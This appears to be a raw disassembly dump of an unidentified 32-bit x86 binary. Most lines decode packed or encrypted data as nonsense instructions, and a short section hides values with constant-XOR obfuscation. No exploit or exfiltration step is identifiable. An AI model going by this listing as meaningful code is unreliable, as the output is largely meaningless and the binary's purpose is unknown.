  41ae51:	out    dx,eax
  41ae52:	mov    eax,ds:0x1c77e6ee
  41ae57:	ficom  DWORD PTR [eax-0x22]
  41ae5a:	popa   
  41ae5b:	xchg   edx,eax
  41ae5c:	jbe    0x41ae03
  41ae5e:	mov    ch,0x1
  41ae60:	outs   dx,DWORD PTR ds:[esi]
  41ae61:	sub    dh,dh
  41ae63:	shl    edi,0x27
  41ae66:	mov    ch,0x5
  41ae68:	ret    0x625f
  41ae6b:	sbb    DWORD PTR cs:0xe1775fb1,0xffffffb7
  41ae73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae74:	xchg   ebp,eax
  41ae75:	xchg   ecx,eax
  41ae76:	fldln2 
  41ae78:	cmp    DWORD PTR [edx-0x20c021de],eax
  41ae7e:	xchg   WORD PTR [edi+0x394e7792],bp
  41ae85:	pop    eax
  41ae86:	into   
  41ae87:	test   DWORD PTR [ebx+0x32a8d7ee],ebx
  41ae8d:	bound  eax,QWORD PTR [ebx-0x3661a2df]
  41ae93:	adc    DWORD PTR [edi-0x80],ebx
  41ae96:	inc    edx
  41ae97:	pop    edx
  41ae98:	inc    ecx
  41ae99:	loopne 0x41ae67
  41ae9b:	or     eax,0xcbbd985e
  41aea0:	xor    ah,dl
  41aea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aea3:	mov    WORD PTR [edi-0x7c],cs
  41aea6:	inc    esi
  41aea7:	fwait
  41aea8:	out    0x3,eax
  41aeaa:	or     al,0xa3
  41aeac:	aaa    
  41aead:	inc    eax
  41aeae:	and    BYTE PTR [edi],dh
  41aeb0:	mov    ah,0xcc
  41aeb2:	sbb    al,0x3
  41aeb4:	push   edx
  41aeb5:	stc    
  41aeb6:	xchg   ebx,eax
  41aeb7:	loopne 0x41af0d
  41aeb9:	push   ecx
  41aeba:	xor    BYTE PTR [eax+eiz*4-0x5a0acd7c],al
  41aec1:	xchg   edx,eax
  41aec2:	imul   edx,DWORD PTR [eax],0xcd4ef509
  41aec8:	fwait
  41aec9:	pop    esi
  41aeca:	push   0x8c441d3f
  41aecf:	es xchg ecx,eax
  41aed1:	mov    al,0x54
  41aed3:	xlat   BYTE PTR ds:[ebx]
  41aed4:	jmp    0x6ac4:0xda2a6f70
  41aedb:	ja     0x41aea1
  41aedd:	mov    BYTE PTR [esi],bl
  41aedf:	mov    edi,0x7e890f15
  41aee4:	adc    eax,0x75226183
  41aee9:	mov    esp,ebp
  41aeeb:	xor    eax,0xfccfa952
  41aef0:	xchg   BYTE PTR [ebx-0x15],al
  41aef3:	xor    bl,al
  41aef5:	loop   0x41ae8f
  41aef7:	(bad)  [edx-0x3a67dfca]
  41aefd:	or     BYTE PTR [esi],0xe
  41af00:	jo     0x41af4e
  41af02:	sub    ebx,esi
  41af04:	jns    0x41af09
  41af06:	mov    WORD PTR [ebp+eax*2-0x1e],es
  41af0a:	(bad)  
  41af0b:	fs ss push eax
  41af0e:	out    dx,eax
  41af0f:	pop    esp
  41af10:	pop    eax
  41af11:	cmp    DWORD PTR [edi-0x55a3a40d],eax
  41af17:	pop    esp
  41af18:	and    BYTE PTR [edx+eiz*2-0x20],bl
  41af1c:	inc    edx
  41af1d:	push   ebp
  41af1e:	mov    DWORD PTR [esi],eax
  41af20:	sbb    ah,ch
  41af22:	jg     0x41aeb3
  41af24:	cmp    DWORD PTR [ebx],esp
  41af26:	icebp  
  41af27:	or     BYTE PTR [ebp-0x78],0xc1
  41af2b:	inc    edx
  41af2c:	fdivr  st,st(2)
  41af2e:	mov    al,ds:0xd9356e2a
  41af33:	(bad)  
  41af34:	sub    bl,ah
  41af36:	pop    edx
  41af37:	cmp    ebp,edi
  41af39:	cld    
  41af3a:	xor    ch,BYTE PTR es:[edx+0x1a3c7b00]
  41af41:	popf   
  41af42:	in     eax,0xaa
  41af44:	mov    dh,0xfb
  41af46:	and    DWORD PTR [ebx+0x12d1137e],esi
  41af4c:	mov    BYTE PTR [esi+0x77e0a094],ah
  41af52:	pop    esi
  41af53:	jge    0x41af28
  41af55:	xchg   ebx,eax
  41af56:	in     eax,0x41
  41af58:	sub    edi,edx
  41af5a:	xchg   edx,eax
  41af5b:	jns    0x41af86
  41af5d:	xor    BYTE PTR [edx],0x8d
  41af60:	adc    edi,DWORD PTR [esi+0x73]
  41af63:	push   esp
  41af64:	or     BYTE PTR [esi-0x24aa3bab],dh
  41af6a:	xor    cl,BYTE PTR [eax]
  41af6c:	cmp    BYTE PTR [ebp+0x6514d7d3],0xbc
  41af73:	xchg   esp,eax
  41af74:	dec    edi
  41af75:	in     al,dx
  41af76:	(bad)  
  41af77:	fisub  WORD PTR [eax-0x3dfcb177]
  41af7d:	scas   eax,DWORD PTR es:[edi]
  41af7e:	add    dh,BYTE PTR [esi-0x66]
  41af81:	imul   edi,DWORD PTR [eax+0x2c609303],0x6c
  41af88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af89:	dec    ebp
  41af8a:	push   edi
  41af8b:	and    edx,esp
  41af8d:	jl     0x41af85
  41af8f:	fs sub ecx,ebx
  41af92:	mov    ecx,0xaf73f389
  41af97:	push   cs
  41af98:	mov    esi,0x2541f6e5
  41af9d:	xchg   ebp,eax
  41af9e:	xor    BYTE PTR [eax+0x2b],0xe7
  41afa2:	jge    0x41afb9
  41afa4:	test   al,0x1f
  41afa6:	cmp    al,0x3e
  41afa8:	fucomp st(3)
  41afaa:	xchg   ebx,eax
  41afab:	popf   
  41afac:	xchg   ebx,ecx
  41afae:	jmp    0x41b1e3
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi-0x6de7effd]
  41afc0:	mov    esp,0xde108a2e
  41afc5:	jg     0x41b03f
  41afc7:	adc    BYTE PTR [esi+0x78],bh
  41afca:	js     0x41af81
  41afcc:	add    eax,0x25c1da8d
  41afd1:	mov    edx,edx
  41afd3:	mov    ecx,0x3b021cdc
  41afd8:	pop    edx
  41afd9:	jecxz  0x41b012
  41afdb:	outs   dx,DWORD PTR ds:[esi]
  41afdc:	scas   eax,DWORD PTR es:[edi]
  41afdd:	and    dl,dh
  41afdf:	nop
  41afe0:	inc    ebp
  41afe1:	data16 fwait
  41afe3:	xlat   BYTE PTR ds:[ebx]
  41afe4:	add    DWORD PTR [esi-0x4a],ebx
  41afe7:	add    al,0xb3
  41afe9:	xor    al,0x19
  41afeb:	mov    eax,ds:0xc616d759
  41aff0:	jne    0x41b016
  41aff2:	fstp   TBYTE PTR [ebx-0x1e62e9fe]
  41aff8:	shl    DWORD PTR [ecx-0x13],0xc4
  41affc:	jg     0x41b056
  41affe:	neg    BYTE PTR [ebx+0x77]
  41b001:	(bad)  
  41b002:	retf   0x2559
  41b005:	jecxz  0x41b05b
  41b007:	std    
  41b008:	out    dx,al
  41b009:	mov    eax,ds:0x73f1fecf
  41b00e:	push   edx
  41b00f:	retf   
  41b010:	inc    edi
  41b011:	dec    esp
  41b012:	sub    BYTE PTR [ebx-0x16132c03],al
  41b018:	jle    0x41b090
  41b01a:	xor    eax,0x52215fb2
  41b01f:	mov    ch,0x84
  41b021:	hlt    
  41b022:	ret    
  41b023:	(bad)  
  41b024:	fisub  WORD PTR [eax-0x1e53095c]
  41b02a:	cmp    ebx,ebx
  41b02c:	xor    DWORD PTR [edi+0x16],esp
  41b02f:	jmp    0x41afca
  41b031:	inc    esp
  41b032:	mov    bl,0xe5
  41b034:	push   cs
  41b035:	jmp    0x41b090
  41b037:	cmp    DWORD PTR [esi+edi*1],0xffffffbb
  41b03b:	pop    ebx
  41b03c:	inc    BYTE PTR [edx-0x71]
  41b03f:	hlt    
  41b040:	aam    0x50
  41b042:	mov    ds:0xe66e01d0,eax
  41b047:	bound  esi,QWORD PTR [eax]
  41b049:	dec    ebp
  41b04a:	sub    al,0xc5
  41b04c:	and    esp,ebx
  41b04e:	sbb    BYTE PTR [eax],0x75
  41b051:	and    DWORD PTR [edx+0x1001950],esp
  41b057:	sub    esi,DWORD PTR [ecx+0x7dd48607]
  41b05d:	mov    dh,0x27
  41b05f:	(bad)  
  41b060:	(bad)  
  41b061:	sub    al,ah
  41b063:	in     al,dx
  41b064:	jecxz  0x41b087
  41b066:	inc    ebp
  41b067:	fidivr WORD PTR [esi+0x66]
  41b06a:	test   eax,esp
  41b06c:	pop    ecx
  41b06d:	mov    bl,0x57
  41b06f:	sub    eax,0xd016afd7
  41b074:	mov    esp,0x6e82f3fe
  41b079:	xchg   ch,ch
  41b07b:	gs inc edi
  41b07d:	bound  eax,QWORD PTR [ecx]
  41b07f:	fist   WORD PTR [esi+0x7098293a]
  41b085:	test   BYTE PTR [ebx-0x23],0xb2
  41b089:	(bad)  
  41b08a:	xchg   DWORD PTR [ecx],esi
  41b08c:	shl    BYTE PTR [esi+0x6],0x67
  41b090:	and    ebp,DWORD PTR [esi+0x12]
  41b093:	and    edx,DWORD PTR [eax+0x127a478a]
  41b099:	mov    ch,0x9c
  41b09b:	fstp   DWORD PTR [eax-0x4]
  41b09e:	nop    DWORD PTR [edx+0x28dc6ab9]
  41b0a5:	repz lahf 
  41b0a7:	mov    ebp,DWORD PTR [edi+0x594cfec9]
  41b0ad:	jb     0x41b0cf
  41b0af:	cmp    al,0xf3
  41b0b1:	ret    0x2764
  41b0b4:	sub    eax,0xc5575d40
  41b0b9:	sbb    ah,BYTE PTR [ecx-0x41]
  41b0bc:	pop    ds
  41b0bd:	xchg   esi,esp
  41b0bf:	mov    esp,0xfa9b6924
  41b0c4:	in     al,0x69
  41b0c6:	sti    
  41b0c7:	retf   
  41b0c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0c9:	fld    st(6)
  41b0cb:	and    DWORD PTR [ebp+edx*4+0x282a4d00],esp
  41b0d2:	aam    0xf9
  41b0d4:	scas   eax,DWORD PTR es:[edi]
  41b0d5:	icebp  
  41b0d6:	pushw  0xb1d2
  41b0da:	jae    0x41b099
  41b0dc:	out    0xac,eax
  41b0de:	shl    DWORD PTR [esi-0x4b],cl
  41b0e1:	out    0xb4,eax
  41b0e3:	xor    eax,0xc5fa50d4
  41b0e8:	add    DWORD PTR [eax-0x26497e4d],esi
  41b0ee:	mov    dh,0xc6
  41b0f0:	pop    es
  41b0f1:	scas   eax,DWORD PTR es:[edi]
  41b0f2:	adc    ebp,DWORD PTR [edx+0x6d]
  41b0f5:	jno    0x41b112
  41b0f7:	jbe    0x41b138
  41b0f9:	xchg   esp,eax
  41b0fa:	add    ebx,DWORD PTR [edx]
  41b0fc:	xor    eax,0xde1a5f3a
  41b101:	push   ebp
  41b102:	fstp   TBYTE PTR [esi+edx*2+0x1da598fe]
  41b109:	shl    DWORD PTR [esi],cl
  41b10b:	je     0x41b139
  41b10d:	push   ecx
  41b10e:	fisub  DWORD PTR [ecx+esi*8]
  41b111:	sqrtps xmm1,XMMWORD PTR [edx]
  41b114:	adc    eax,0x525cc6f0
  41b119:	lea    ebp,[ebp-0x5f]
  41b11c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b11d:	inc    ebp
  41b11e:	into   
  41b11f:	retf   
  41b120:	call   DWORD PTR [eax-0x5c]
  41b123:	outs   dx,DWORD PTR ds:[esi]
  41b124:	dec    ebx
  41b125:	shl    BYTE PTR [esp+edx*1+0x4a],1
  41b129:	idiv   BYTE PTR [ecx+0x7b]
  41b12c:	pop    ds
  41b12d:	xchg   BYTE PTR [edx*2+0x102684a7],al
  41b134:	pop    ss
  41b135:	inc    esp
  41b136:	push   0x53dfd9f7
  41b13b:	enter  0xbc5,0xf4
  41b13f:	xlat   BYTE PTR ds:[ebx]
  41b140:	add    BYTE PTR [ebp-0x28],dl
  41b143:	push   ebx
  41b144:	xor    ebx,DWORD PTR [edi]
  41b146:	dec    ebp
  41b147:	adc    ebx,edi
  41b149:	scas   eax,DWORD PTR es:[edi]
  41b14a:	pop    edx
  41b14b:	out    dx,eax
  41b14c:	dec    edi
  41b14d:	fdivr  QWORD PTR [esi-0x5]
  41b150:	out    0xfa,eax
  41b152:	mov    bl,0x42
  41b154:	cmp    eax,0x2ec7c040
  41b159:	push   cs
  41b15a:	fistp  DWORD PTR [edi-0x8]
  41b15d:	fwait
  41b15e:	jecxz  0x41b11c
  41b160:	dec    ebp
  41b161:	fist   WORD PTR [ecx]
  41b163:	icebp  
  41b164:	sub    eax,0x4f3701ba
  41b169:	mov    ah,0xab
  41b16b:	mov    eax,ds:0x6dd88cf7
  41b170:	iret   
  41b171:	retf   0xb976
  41b174:	push   esi
  41b175:	inc    ebp
  41b176:	int3   
  41b177:	jg     0x41b19b
  41b179:	test   dl,bh
  41b17b:	sbb    eax,0xb1fc7835
  41b180:	dec    ebx
  41b181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b182:	adc    esp,DWORD PTR [edi+0x3c35ff3d]
  41b188:	jmp    0x5f8e4147
  41b18d:	test   al,0xfd
  41b18f:	cmp    eax,0xdc5f21e9
  41b194:	jmp    0x20109bc
  41b199:	movzx  esi,BYTE PTR [edi-0x184a2237]
  41b1a0:	mov    edi,0x98020c17
  41b1a5:	or     al,BYTE PTR [eax+0x36f69cfe]
  41b1ab:	(bad)  
  41b1ac:	xchg   ecx,eax
  41b1ad:	inc    esp
  41b1ae:	aaa    
  41b1af:	sub    dh,BYTE PTR [ebp+0x7d]
  41b1b2:	add    eax,0x606c62a9
  41b1b7:	pop    es
  41b1b8:	das    
  41b1b9:	adc    eax,0xd25e7ddb
  41b1be:	jbe    0x41b154
  41b1c0:	jg     0x41b164
  41b1c2:	ins    BYTE PTR es:[edi],dx
  41b1c3:	or     BYTE PTR [ebx+0x45],ch
  41b1c6:	add    BYTE PTR [esi+0x51b446d3],cl
  41b1cc:	add    al,0xd8
  41b1ce:	mov    eax,DWORD PTR [edx-0x7d]
  41b1d1:	(bad)  
  41b1d2:	mul    al
  41b1d4:	adc    al,0xdd
  41b1d6:	stc    
  41b1d7:	sbb    BYTE PTR [esi+0x12f21884],bh
  41b1dd:	ret    
  41b1de:	add    edx,ecx
  41b1e0:	call   0xe445:0x8b49bf69
  41b1e7:	jmp    0x41b41c
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	addr16 ss shr dh,0x1
  41b1fa:	shl    BYTE PTR [edi+0x28],0xdc
  41b1fe:	jg     0x41b278
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b23c
  41b205:	test   BYTE PTR [bx+si+0x2365],bh
  41b20a:	push   ecx
  41b20b:	(bad)
  41b20f:	jmp    0x41b1b7
  41b211:	cdq    
  41b212:	adc    ah,BYTE PTR [ebp+0x4b]
  41b215:	jne    0x41b270
  41b217:	xor    al,BYTE PTR [ebx-0x2d]
  41b21a:	(bad)  
  41b21b:	repz addr16 cdq 
  41b21e:	cld    
  41b21f:	jmp    0x34c8fc60
  41b224:	push   0x12
  41b226:	mov    eax,0x7ecd1e77
  41b22b:	rcl    edx,1
  41b22d:	loopne 0x41b202
  41b22f:	mov    ecx,0x9fb5895d
  41b234:	or     DWORD PTR [ecx],esp
  41b236:	pushf  
  41b237:	and    BYTE PTR [esi],bh
  41b239:	stos   BYTE PTR es:[edi],al
  41b23a:	jp     0x41b2b7
  41b23c:	nop
  41b23d:	pop    ss
  41b23e:	mov    ah,BYTE PTR [eax]
  41b240:	out    0xc4,al
  41b242:	mov    bh,0x6b
  41b244:	xchg   DWORD PTR [eax],eax
  41b246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b247:	dec    esi
  41b248:	aas    
  41b249:	adc    BYTE PTR [eax-0x145d186c],dl
  41b24f:	inc    esp
  41b250:	scas   eax,DWORD PTR es:[edi]
  41b251:	dec    esi
  41b252:	cmp    al,0xe8
  41b254:	es retf 
  41b256:	shl    DWORD PTR [eiz*2-0x3e7cd0a7],0xe8
  41b25e:	ret    
  41b25f:	(bad)  
  41b260:	cmp    ecx,eax
  41b262:	jo     0x41b2c9
  41b264:	inc    edi
  41b265:	pop    edi
  41b266:	nop
  41b267:	ins    DWORD PTR es:[edi],dx
  41b268:	loope  0x41b24e
  41b26a:	ins    DWORD PTR es:[edi],dx
  41b26b:	mov    ch,0x99
  41b26d:	aam    0x87
  41b26f:	adc    al,0x5d
  41b271:	ins    BYTE PTR es:[edi],dx
  41b272:	jmp    0xac5f0909
  41b277:	mov    eax,ds:0x7a874c15
  41b27c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b27d:	add    al,0xde
  41b27f:	shr    DWORD PTR gs:[ebx],1
  41b282:	mov    ?,WORD PTR [ebp+0x4b]
  41b285:	in     al,0xf7
  41b287:	repz hlt 
  41b289:	cmp    esp,eax
  41b28b:	in     al,0xe7
  41b28d:	popa   
  41b28e:	mov    DWORD PTR [ebp+eiz*2-0x2eb0b13c],ebx
  41b295:	cmc    
  41b296:	rol    DWORD PTR [esi-0x1a],1
  41b299:	fadd   DWORD PTR ds:0x80b19f1
  41b29f:	or     dl,BYTE PTR [ecx]
  41b2a1:	or     al,0x91
  41b2a3:	mul    ebp
  41b2a5:	push   ecx
  41b2a6:	and    DWORD PTR [ecx-0x1ddcdb2f],0x16f5752b
  41b2b0:	ret    0xd316
  41b2b3:	push   eax
  41b2b4:	pop    ss
  41b2b5:	(bad)  
  41b2b6:	call   0xf90fecf
  41b2bb:	jae    0x41b29a
  41b2bd:	jl     0x41b30d
  41b2bf:	fisttp DWORD PTR [ebp+0x5e]
  41b2c2:	sub    BYTE PTR [ebx],0x1b
  41b2c5:	out    0xb2,al
  41b2c7:	adc    al,0x72
  41b2c9:	push   0xc2bf1a78
  41b2ce:	int3   
  41b2cf:	pop    esi
  41b2d0:	mov    ebp,0x617edfed
  41b2d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2d6:	cmc    
  41b2d7:	imul   edi,DWORD PTR [ecx],0x53
  41b2da:	cmp    edx,DWORD PTR [ebp+0x66513330]
  41b2e0:	aam    0xa5
  41b2e2:	adc    al,0xc
  41b2e4:	(bad)  
  41b2e5:	cmp    DWORD PTR [esp],esi
  41b2e8:	repnz push ss
  41b2ea:	out    0x69,eax
  41b2ec:	cld    
  41b2ed:	jnp    0x41b30b
  41b2ef:	mov    ebp,0xc753c482
  41b2f4:	pop    edi
  41b2f5:	cwde   
  41b2f6:	pop    es
  41b2f7:	jo     0x41b33f
  41b2f9:	sbb    eax,0xdb3fe1ca
  41b2fe:	cmp    cl,BYTE PTR [eax]
  41b300:	(bad)  
  41b301:	loop   0x41b2b9
  41b303:	xor    eax,0x5befee03
  41b308:	in     al,dx
  41b309:	mov    cl,0xda
  41b30b:	ror    DWORD PTR [eax-0x46bab954],0xcc
  41b312:	xchg   edx,eax
  41b313:	mov    eax,0x9d977df1
  41b318:	pop    edx
  41b319:	enter  0x651f,0x3c
  41b31d:	jo     0x41b36f
  41b31f:	mov    ecx,0xa16fdddd
  41b324:	jge    0x41b2f7
  41b326:	push   DWORD PTR [ecx+0x35e6e8ae]
  41b32c:	rol    BYTE PTR [ecx+eax*1-0xf],cl
  41b330:	fcmovnu st,st(1)
  41b332:	stc    
  41b333:	jae    0x41b2b9
  41b335:	pusha  
  41b336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b337:	adc    al,0xb4
  41b339:	mov    DWORD PTR [eax-0x79d17ea7],ebp
  41b33f:	gs adc eax,0xec265ec9
  41b345:	and    BYTE PTR [ecx],dh
  41b347:	mov    DWORD PTR [eax+edx*1+0x3d],eax
  41b34b:	mov    al,ds:0xc92e3038
  41b350:	push   ebp
  41b351:	adc    DWORD PTR [ecx],ebp
  41b353:	add    ecx,eax
  41b355:	mov    esp,0x58af8a10
  41b35a:	cmp    al,bh
  41b35c:	dec    ebp
  41b35d:	dec    esp
  41b35e:	cs mov bh,0xb
  41b361:	adc    BYTE PTR [esi],ch
  41b363:	mov    dl,0x31
  41b365:	mov    ebx,0x8fa16deb
  41b36a:	xchg   BYTE PTR [esi],ch
  41b36c:	push   ebp
  41b36d:	das    
  41b36e:	ret    0x9b0c
  41b371:	je     0x41b3e8
  41b373:	mov    gs,WORD PTR [eax+eax*2-0x451a69fa]
  41b37a:	xchg   ebp,eax
  41b37b:	enter  0x3564,0x42
  41b37f:	clc    
  41b380:	jne    0x41b36b
  41b382:	sub    al,BYTE PTR [esi+eax*1-0x67309cc3]
  41b389:	xor    cl,BYTE PTR ds:0x4039c3cf
  41b38f:	mov    cl,0x9a
  41b391:	cli    
  41b392:	mov    ah,0x4e
  41b394:	jns    0x8a4cd80a
  41b39a:	lds    ecx,FWORD PTR ss:[ecx-0x22363a1e]
  41b3a1:	mov    esi,0xaeee33ef
  41b3a6:	xchg   al,cl
  41b3a8:	mov    ds:0xc139890f,al
  41b3ad:	inc    edi
  41b3ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3af:	aaa    
  41b3b0:	push   sp
  41b3b2:	popa   
  41b3b3:	sahf   
  41b3b4:	jecxz  0x41b3b0
  41b3b6:	push   esi
  41b3b7:	sub    DWORD PTR [ebp-0x19],esi
  41b3ba:	ins    BYTE PTR es:[edi],dx
  41b3bb:	sbb    ebx,DWORD PTR [eax-0x80]
  41b3be:	add    DWORD PTR ds:0xbc5341c7,ebp
  41b3c4:	pop    ebx
  41b3c5:	jae    0x41b37e
  41b3c7:	sub    bl,BYTE PTR [edi]
  41b3c9:	sahf   
  41b3ca:	inc    esp
  41b3cb:	jg     0x41b3ce
  41b3cd:	je     0x41b427
  41b3cf:	or     edx,DWORD PTR [esi+0xf]
  41b3d2:	inc    edi
  41b3d3:	imul   edx,DWORD PTR [ebx+0x5eb0acf2],0x95a4f163
  41b3dd:	mov    ch,0x33
  41b3df:	jne    0x41b3bf
  41b3e1:	out    dx,eax
  41b3e2:	loope  0x41b37c
  41b3e4:	arpl   WORD PTR ds:0x5f55ccfd,bp
  41b3ea:	lods   eax,DWORD PTR ds:[esi]
  41b3eb:	call   0xcdea:0xfaaf7983
  41b3f2:	repnz inc esp
  41b3f4:	xor    al,0x5
  41b3f6:	add    DWORD PTR [edx-0x469f0027],ebx
  41b3fc:	jmp    0x41b3ec
  41b3fe:	mov    WORD PTR [ebx-0x52c4e915],ss
  41b404:	scas   al,BYTE PTR es:[edi]
  41b405:	addr16 in al,0x52
  41b408:	lahf   
  41b409:	adc    al,0x41
  41b40b:	mov    ebp,0x31124ee8
  41b410:	out    dx,al
  41b411:	clc    
  41b412:	jecxz  0x41b486
  41b414:	imul   edx,DWORD PTR [edi-0x56],0x9ba9bd19
  41b41b:	cwde   
  41b41c:	imul   eax,ecx
  41b41f:	sub    esp,eax
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	add    BYTE PTR [eax+ebp*8-0x51],bh
  41b4bd:	shl    dl,0x7f
  41b4c0:	js     0x41b4d2
  41b4c2:	jle    0x41b53c
  41b4c4:	js     0x41b4b3
  41b4c6:	enter  0x85e2,0x5e
  41b4ca:	jbe    0x41b4b5
  41b4cc:	cdq    
  41b4cd:	xchg   esp,eax
  41b4ce:	dec    ecx
  41b4cf:	fcmovnb st,st(1)
  41b4d1:	inc    eax
  41b4d2:	iret   
  41b4d3:	dec    edx
  41b4d4:	fld    st(5)
  41b4d6:	pop    ecx
  41b4d7:	mov    dh,0xab
  41b4d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4da:	jae    0x41b4fc
  41b4dc:	shl    DWORD PTR [eax+0xc],0x5d
  41b4e0:	mov    eax,ds:0xb03cc8e6
  41b4e5:	repz jle 0x41b526
  41b4e8:	cmp    bh,bl
  41b4ea:	cdq    
  41b4eb:	dec    esp
  41b4ec:	sbb    eax,0xd216c3f1
  41b4f1:	sti    
  41b4f2:	(bad)
  41b4f5:	and    al,0xda
  41b4f7:	retf   
  41b4f8:	push   ebp
  41b4f9:	xor    bh,ch
  41b4fb:	ret    0xaa53
  41b4fe:	bound  edx,QWORD PTR [esi]
  41b500:	adc    DWORD PTR [esp+eax*4+0x39200bd4],ebp
  41b507:	outs   dx,BYTE PTR ds:[esi]
  41b508:	call   0x1ac57ad5
  41b50d:	lahf   
  41b50e:	cmp    ecx,DWORD PTR [eax+eiz*2+0x1ca3eba1]
  41b515:	and    DWORD PTR [edi+edx*2+0x3a38f10],eax
  41b51c:	ucomiss xmm4,DWORD PTR [ebp+eiz*8+0x707aa472]
  41b524:	int    0x78
  41b526:	jge    0x41b50b
  41b528:	sti    
  41b529:	mov    esi,ecx
  41b52b:	xlat   BYTE PTR ds:[ebx]
  41b52c:	push   es
  41b52d:	loope  0x41b535
  41b52f:	(bad)  
  41b530:	test   eax,0xdaaad815
  41b535:	mov    WORD PTR [edx-0x286abc27],?
  41b53b:	xorps  xmm2,XMMWORD PTR ds:0x61b6fe81
  41b542:	pop    ds
  41b543:	repnz mov ebp,0x1d82942e
  41b549:	mov    cl,0x5a
  41b54b:	mov    WORD PTR [ebp+0x53],cs
  41b54e:	cdq    
  41b54f:	push   cs
  41b550:	xor    eax,0x475777eb
  41b555:	xchg   esp,eax
  41b556:	cmp    eax,0x1c3fdaf7
  41b55b:	sti    
  41b55c:	inc    edx
  41b55d:	ret    
  41b55e:	push   edi
  41b55f:	ret    
  41b560:	jmp    0xe203:0x627bbe6b
  41b567:	repnz in eax,dx
  41b569:	sub    BYTE PTR [esp+ecx*2],ch
  41b56c:	lds    ebx,FWORD PTR [ecx+0x3f]
  41b56f:	and    BYTE PTR [ebp+eiz*8-0x2e],ch
  41b573:	inc    edi
  41b574:	jp     0x41b5d6
  41b576:	ds xchg edi,eax
  41b578:	icebp  
  41b579:	xor    ah,dl
  41b57b:	or     bh,BYTE PTR [ecx-0x2c]
  41b57e:	lds    esi,FWORD PTR [ebp-0x2d75c74c]
  41b584:	test   al,0x14
  41b586:	lahf   
  41b587:	sar    BYTE PTR [edx-0x3d],1
  41b58a:	aam    0x7c
  41b58c:	les    ecx,FWORD PTR [esi]
  41b58e:	ja     0x41b560
  41b590:	add    bl,dl
  41b592:	addr16 mov al,0x67
  41b595:	mov    cl,dh
  41b597:	xchg   esi,eax
  41b598:	push   cs
  41b599:	inc    ebp
  41b59a:	and    eax,0x6f7f128c
  41b59f:	imul   edi,DWORD PTR [eax-0x20],0xfffffffd
  41b5a3:	add    eax,0x55f269b7
  41b5a8:	fcomip st,st(0)
  41b5aa:	xchg   edx,eax
  41b5ab:	adc    BYTE PTR [esi+0x59ddc5fa],bh
  41b5b1:	jmp    0x41b593
  41b5b3:	fcomi  st,st(4)
  41b5b5:	out    dx,al
  41b5b6:	std    
  41b5b7:	pop    esi
  41b5b8:	jne    0x41b593
  41b5ba:	sbb    ecx,DWORD PTR [ebx-0x34]
  41b5bd:	aaa    
  41b5be:	xor    eax,0x9a614972
  41b5c3:	inc    ecx
  41b5c4:	hlt    
  41b5c5:	icebp  
  41b5c6:	cwde   
  41b5c7:	xchg   edx,eax
  41b5c8:	xchg   BYTE PTR [ebx+edi*2],ah
  41b5cb:	in     eax,0x8f
  41b5cd:	mov    esp,0x15ed0136
  41b5d2:	sahf   
  41b5d3:	mov    ds:0xf39d3f23,eax
  41b5d8:	dec    ebp
  41b5d9:	idiv   BYTE PTR [edi]
  41b5db:	mov    ds:0xd9c964db,eax
  41b5e0:	dec    eax
  41b5e1:	and    esp,esp
  41b5e3:	mov    WORD PTR [esi],?
  41b5e5:	xchg   ebx,eax
